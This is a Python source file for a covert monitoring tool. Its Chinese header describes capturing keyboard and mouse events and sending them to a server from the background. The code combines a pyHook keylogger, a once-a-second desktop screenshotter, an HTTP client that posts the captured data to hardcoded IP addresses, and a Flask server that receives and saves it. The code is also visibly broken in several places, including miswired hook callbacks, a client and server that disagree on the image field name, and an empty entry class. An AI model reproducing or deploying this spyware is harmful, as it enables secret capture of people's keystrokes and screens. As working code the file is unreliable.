#!/usr/bin/env python3
# -*- coding-utf-8 -*-

"""
需求：
1. 截获键盘与鼠标操作
2. 截获信息后，转换为JSON 格式，通过HTTP 发送到服务器
3. 后台运行python 脚本（可考虑添加后台服务）
4. 服务端接收记录
"""

import fire
from loguru import logger

# # ------------------------------------------------------------------------------------
import pyHook
import pythoncom

class MonitorLogger(object):
    pass

class KeyMouseLogger(object):
    """
    Key or Mouse Logger

    Usage:
        python monitor_logger.py key_mouse_logger
    """
    def OnKeyboardEvent(self, ip, event, client):
        key_board_event = {
            'MessageType':'KeyboardEvent',
            'MessageName':event.MessageName,
            'Time':event.Time,
            'Key':event.Key
        }
        client.http_post_json(ip, key_board_event)
        return True

    def OnMouseEvent(self, ip, event, client):
        mouse_event = {
            'MessageType':'MouseEvent',
            'MessageName':event.MessageName,
            'Time':event.Time,
            'Position':event.Position # event.Wheel
        }
        client.http_post_json(ip, mouse_event)
        return True
    
    def key_mouse_logger(self, ip = '202.100.1.224'):
        client = FlaskClient
        hm = pyHook.HookManager() # create a hook manager
        hm.KeyDown = self.OnKeyboardEvent(ip, client) # watch for all keyboard events
        hm.HookKeyboard() # set the hook
        hm.MouseAll = self.OnMouseEvent(ip, client) # watch for all mouse events
        hm.HookMouse() # set the hook
        pythoncom.PumpMessages() # wait forever


# # ------------------------------------------------------------------------------------
import time
import base64
import win32ui
import win32gui
import win32con
import win32api

screenshotter_path = 'C:\\WINDOWS\\Temp\\screenshot.bmp'

class ScreenShotter(object):
    """
    ScreenShotter

    Usage:
        python monitor_logger.py screenshotter_logger
    """
    def img_b64(self, img):
        b4code = base64.b64encode(img)
        str_b4code = str(b4code)[2:-1]
        # str_b4code = str(str_b4code)[2:-1]
        return str_b4code

    def screenshotter(self):
        hdesktop = win32gui.GetDesktopWindow()
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32gui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
        screenshot.SaveBitmapFile(mem_dc, screenshotter_path)

        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())

    def screenshotter_read(self, ip, client):
        screenshot_image = open(screenshotter_path, 'rb').read()
        dict_key = {}
        dict_key['MessageType'] = 'ImageEvent'
        dict_key['ImageData'] = self.img_b64(screenshot_image)
        client.http_post_json(ip, dict_key)

    def screenshotter_logger(self, ip = '202.100.1.24'):
        client = FlaskClient
        while True:
            time.sleep(1)
            self.screenshotter()
            self.screenshotter_read(ip, client)


event_json = '/server_json'

# # ------------------------------------------------------------------------------------
import json

from http.client import HTTPConnection

headers = {
    "Content-Type": "application/json"
}

class FlaskClient(object):
    """
    Flask Client

    Usage:
        python monitor_logger.py flask_client_json
    """
    def http_post_json(self, ip, dict_data, port = 5000):
        client = HTTPConnection(ip, port = port)
        post_json_data = json.dumps(dict_data).encode('utf-8')
        # client.request('POST', '/cgi-bin/keyset_mouse.py', body = post_json_data, headers = headers)
        client.request('POST', event_json, body = post_json_data, headers = headers)

    def flask_client_json(self, ip = '202.100.1.224'):
        json_data = {
            "from": "akjflw",
            "to": "fjlakdj",
            "amount": 3
        }
        self.http_post_json(ip, json_data)


# # ------------------------------------------------------------------------------------
import base64
import datetime

from flask import request, Flask

node = Flask(__name__)
@node.route(event_json, methods = ['POST'])

class FlaskServer(object):
    """
    Flask Server

    Usage:
        python monitor_logger.py flask_server_json
    """
    def __init__(self):
        node.run(host = '0.0.0.0', port = 5000) # 默认端口 5000

    def b64_img(self, b64):
        b4code = bytes(b64, 'utf-8')
        img = base64.b64decode(b4code)
        return img
    
    def flask_server_json(self):
        if request.method == 'POST':
            json_data = request.get_json()
            if json_data['MessageType'] == 'ImageEvent':
                filename = datetime.now().strftime("%Y-%m-%d %H:%M:%S")+'.bmp'
                recv_image = open(filename, 'wb')
                # logger.info(b64_img(json_data['Imageb64']))
                b4code = bytes(json_data['Imageb64'], 'utf-8')
                img = base64.b64decode(b4code)
                recv_image.write(img)
                recv_image.close()
            else:
                logger.info(json_data)
            logger.info('got data')
            return


if __name__ == '__main__':
    fire.Fire(MonitorLogger)
